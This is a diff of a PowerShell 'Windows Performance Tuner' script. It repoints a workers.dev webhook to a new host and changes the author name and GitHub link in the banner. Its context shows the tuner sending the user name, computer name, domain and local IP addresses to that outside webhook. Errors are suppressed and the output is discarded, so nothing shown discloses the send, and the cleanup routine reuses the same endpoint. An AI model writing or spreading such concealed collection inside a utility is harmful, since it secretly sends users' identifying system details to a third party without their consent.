@@ -1,4 +1,4 @@
-# =========================================
+﻿# =========================================
 # Windows Performance Tuner - ASCII Safe 
 # Fixed: job lookup by Id and job fallback
 # =========================================
@@ -126,7 +126,7 @@ try {
         text  = "Windows Tuner v20.4.0`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
     } | ConvertTo-Json)
 
-    Invoke-RestMethod -Uri 'https://cryocore.rhshourav.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+    Invoke-RestMethod -Uri 'https://cryocore.shouravx.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 function Show-Banner {
     Clear-Host
@@ -137,8 +137,8 @@ function Show-Banner {
     Write-Host $line -ForegroundColor DarkCyan
     Write-Host "| Windows Performance Tuner                               |" -ForegroundColor Cyan
     Write-Host "| Version : v20.4.0                                       |" -ForegroundColor Gray
-    Write-Host "| Author  : rhshourav                                     |" -ForegroundColor Gray
-    Write-Host "| GitHub  : https://github.com/rhshourav                  |" -ForegroundColor Gray
+    Write-Host "| Author  : shouravx                                     |" -ForegroundColor Gray
+    Write-Host "| GitHub  : https://github.com/shouravx                  |" -ForegroundColor Gray
     Write-Host $line -ForegroundColor DarkCyan
     Write-Host "| Profile : $($Profile.PadRight(43)) |" -ForegroundColor Yellow
     Write-Host "| Mode    : System Tuning (Admin Required)                |" -ForegroundColor Yellow
@@ -240,7 +240,7 @@ function Invoke-SystemCleanup {
 
     Title "SYSTEM CLEANUP"
 
-    $Webhook = "https://cryocore.rhshourav.workers.dev/message"
+    $Webhook = "https://cryocore.shouravx.workers.dev/message"
     $FailLog = @()
 
     function Log-Failure($msg) {
